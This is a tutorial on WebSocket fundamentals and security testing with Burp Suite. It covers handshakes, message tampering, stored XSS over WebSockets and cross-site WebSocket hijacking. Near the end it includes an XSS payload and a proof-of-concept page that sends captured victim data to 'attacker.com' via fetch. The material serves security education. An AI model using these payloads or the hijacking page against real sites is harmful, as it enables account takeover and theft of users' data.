## Table of Contents

1. [WebSockets Fundamentals](#1-websockets-fundamentals)
   1. [What are they](#11---what-are-they)
   2. [How does a connection get set up](#12---how-does-a-connection-get-set-up)
   3. [What do the actual messages look like](#13---what-do-the-actual-messages-look-like)
2. [Manipulating WebSocket Traffic](#2-manipulating-websocket-traffic)
   1. [Intercepting and Modifying Messages](#21---intercepting-and-modifying-messages)
   2. [Replaying and Generating New Messages](#22---replaying-and-generating-new-messages)
   3. [Manipulating the WebSocket Connection (Handshake)](#23---manipulating-the-websocket-connection-handshake)
3. [WebSocket Security Vulnerabilities](#3-websocket-security-vulnerabilities)
   1. [Exploiting via WebSocket Messages](#31---exploiting-via-websocket-messages)
   2. [Exploiting via the Handshake](#32---exploiting-via-the-handshake)
   3. [Cross-Site WebSocket Hijacking (CSWSH)](#33---cross-site-websocket-hijacking-cswsh)

---

# 1. WebSockets fundamentals

## 1.1 - What are they

A WebSocket is a connection between your browser and a server that lets **both sides send messages whenever they want**, in either direction, over one connection that stays open. Think of it like a phone call, versus HTTP which is more like sending letters back and forth.

## HTTP vs WebSockets

**HTTP:** Client asks a question, server answers. Done. Repeat for the next question.

```
Client → Server:  "GET /data"
Server → Client:  "Here's your data"
(transaction over)
```

**WebSockets:** One connection stays open, and either side can talk at any moment — no need to "ask" first.

```
Client → Server:  "hey, new order came in"
Server → Client:  "price updated"
Server → Client:  "price updated again"
Client → Server:  "cancel order"
(connection just stays open, chatting whenever)
```

This makes WebSockets great for things like live stock prices, chat apps, or notifications — anything where the server needs to push data instantly without the client repeatedly asking "anything new?".

## 1.2 - How does a connection get set up

It starts as a normal HTTP request that asks to "upgrade" to a WebSocket. Your browser handles this for you with one line of JavaScript:

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

> `wss://` = encrypted (like https), `ws://` = unencrypted (like http)

Behind the scenes, this is what actually happens:

**1. Browser sends a handshake request** (still just HTTP):
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

**2. Server agrees and responds:**
```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

Once you see `101 Switching Protocols`, the handshake is done — the HTTP connection has now become a WebSocket connection, and messages can flow freely both ways.

**Quick cheat sheet on the headers:**

| Header | What it does |
|---|---|
| `Connection` / `Upgrade` | Signals "this is a WebSocket handshake, not a normal request" |
| `Sec-WebSocket-Version` | Which version of the protocol to use (almost always `13`) |
| `Sec-WebSocket-Key` | A random value the client generates each time |
| `Sec-WebSocket-Accept` | Server proves it understood the request by hashing that key (prevents confused/misconfigured servers or proxies from accidentally "accepting")|

## 1.3 - What do the actual messages look like

Once connected, sending a message is as simple as:

```javascript
ws.send("Peter Wiener");
```

There's no fixed format — a message can be plain text, binary, whatever. But most apps send **JSON** so the data is structured. For example, a chat app might send:

```json
{
  "user": "Hal Pline",
  "content": "I wanted to be a Playstation growing up, not a device to answer your inane questions"
}
```

The server can just as easily push a message to the client without being asked — that's the whole point.

---

# 2. Manipulating WebSocket Traffic

Since WebSockets are designed to be trusted and flexible, testing them for vulnerabilities usually means poking at them in ways the app never expected — sending weird messages, replaying old ones, or messing with the handshake itself. **Burp Suite** is the standard tool for this.

Burp lets you do three main things:
1. **Intercept & modify** messages as they fly by
2. **Replay & craft** new messages
3. **Manipulate the handshake/connection** itself

---

## 2.1 - Intercepting and Modifying Messages

This lets you catch a WebSocket message mid-flight and edit it before it reaches the client or server.

**Steps:**
1. Open Burp's built-in browser.
2. Use the app feature that relies on WebSockets. You'll know it's using them because entries show up in Burp Proxy's **WebSockets history** tab.
3. In Burp Proxy's **Intercept** tab, make sure interception is turned **on**.
4. Any message sent (browser → server, or server → browser) will pop up in Intercept for you to inspect or edit.
5. Hit **Forward** to send it on.

> 💡 You can choose *which direction* to intercept (client→server, server→client, or both) in **Settings → WebSocket interception rules**.

---

## 2.2 - Replaying and Generating New Messages

This is where **Burp Repeater** comes in — instead of just editing a message once, you can resend it as many times as you want, or write brand-new messages from scratch.

**Steps:**
1. In Burp Proxy (WebSockets history or Intercept tab), right-click a message → **Send to Repeater**.
2. In Repeater, edit the message and re-send it repeatedly to test different payloads.
3. You can send messages in **either direction** — pretend to be the client, or pretend to be the server.
4. The **History** panel in Repeater shows everything sent over that connection — both your test messages and the real ones from the browser/server.
5. Want to tweak an old message? Right-click it in history → **Edit and resend**.

**Example workflow:**
```
1. App sends:      {"action":"getBalance","user":"alice"}
2. You intercept, change "alice" → "bob"
3. Forward it
4. See if you just accessed bob's account data 👀
```

---

## 2.3 - Manipulating the WebSocket Connection (Handshake)

Sometimes editing messages isn't enough — you need to mess with the **handshake** itself (the initial `GET` request that upgrades HTTP to WebSocket).

**Why you'd need to do this:**
- 🔍 To reach hidden attack surface only exposed during handshake
- 🔌 Your connection dropped after an attack and you need a fresh one
- ⏰ Tokens/cookies in the original handshake expired and need refreshing

**Steps (in Burp Repeater):**
1. Send a WebSocket message to Repeater (as above).
2. Click the **pencil icon** next to the WebSocket URL.
3. A wizard pops up with three options:
   - **Attach** to an existing live connection
   - **Clone** a connected WebSocket
   - **Reconnect** to a disconnected one
4. If you pick Clone or Reconnect, you'll see the full handshake request (headers, cookies, tokens, etc.) — edit anything you like.
5. Click **Connect**. Burp attempts the handshake and shows you the result.
6. If it connects successfully, you now have a live WebSocket you can send new test messages through in Repeater.

**Example — editing a stale handshake:**
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: [Burp generates a fresh one]
Connection: keep-alive, Upgrade
Cookie: session=EXPIRED_TOKEN_HERE   ← swap this for a valid one
Upgrade: websocket
```

---

# 3. WebSocket Security Vulnerabilities

Here's the key insight: **WebSockets aren't a special category of vulnerability — they're just another transport for the same old web vulnerabilities.** Anything that can go wrong with normal HTTP input can go wrong here too:

* User input sent to the server could trigger **SQL injection**, **XXE**, etc. if handled unsafely
* Some bugs won't show any visible response, so you'll need **out-of-band (OAST)** techniques to detect them
* If attacker data gets broadcast to *other* users, that's a recipe for **XSS** or other client-side attacks

There are two main angles of attack: tampering with the **messages**, or tampering with the **handshake**.

---

## 3.1 - Exploiting via WebSocket Messages

Most input-based bugs are found simply by editing the contents of messages as they pass through (see the interception techniques above).

**Example — a chat app:**

You type a message, and the browser sends:
```json
{"message":"Hello Carlos"}
```

The server relays this to other users, and their browser renders it directly into the page:
```html
<td>Hello Carlos</td>
```

No sanitization happening here. So instead of a normal message, send this:
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

Now every user who receives that chat message gets an `alert(1)` popup — classic stored XSS, just delivered over a WebSocket instead of a form submission.

---

## 3.2 - Exploiting via the Handshake

Some flaws only show up when you mess with the **handshake request itself**, not the messages that follow. These are usually design/logic flaws, like:

* Trusting spoofable headers for security decisions (e.g. blindly trusting `X-Forwarded-For` for IP-based access control)
* Broken session handling — since the session used for the *entire* WebSocket connection is normally locked in at the handshake stage
* Extra attack surface from custom headers the app adds to the handshake

---

## 3.3 - Cross-Site WebSocket Hijacking (CSWSH)

### What is it?

Think of this as **CSRF, but for WebSockets** — and worse.

It happens when a WebSocket handshake relies **only on cookies** for authentication, with no CSRF token or other unpredictable value. Since browsers auto-attach cookies to cross-site requests, an attacker's website can open a WebSocket connection to the vulnerable app, and it'll be treated as if it came from the logged-in victim.

The scary part: unlike normal CSRF (which is basically "fire and forget"), the attacker gets a **live, two-way channel**. They can:
- Send messages to the server *as the victim*
- Read whatever the server sends back

### Why it matters (Impact)

- **Perform actions as the victim** — same as regular CSRF: if the app lets clients trigger sensitive actions via WebSocket messages, the attacker can trigger them too
- **Steal data** — this is the part regular CSRF *can't* do. Since the attacker can read server responses, any sensitive data the server pushes over the socket gets captured too

### How to Test for It

**Step 1: Check the handshake for CSRF protection.**

Look for a handshake like this:
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

This is a red flag: the **only** identifying credential is the `session` cookie. There's no CSRF token, no per-request secret — anything unpredictable.

> ⚠️ Don't be fooled by `Sec-WebSocket-Key` — it looks random and secret, but it's not a security token. It's just there to stop caching proxies from messing with the handshake.

**Step 2: Build a malicious page that opens a cross-site WebSocket.**

If the victim visits the attacker's page while logged into the vulnerable app, their browser will happily attach the session cookie to the WebSocket handshake — no permission asked.

**Step 3: Abuse the live connection.** Depending on what the app does, this could mean:
- Sending messages to trigger actions (change password, transfer funds, post as the victim, etc.)
- Sending a request-type message and reading back sensitive data
- Just sitting quietly and listening — if the server pushes data automatically (like a live feed of private messages), the attacker doesn't even need to send anything

**Minimal PoC page concept:**
```html
<script>
  var ws = new WebSocket("wss://vulnerable-website.com/chat");
  ws.onopen = function() {
    ws.send("READY"); // trigger whatever the app expects
  };
  ws.onmessage = function(event) {
    // exfiltrate captured data to attacker's server
    fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
  };
</script>
```

The victim just needs to have this page open in a tab while logged into the target site — no clicks required.

---
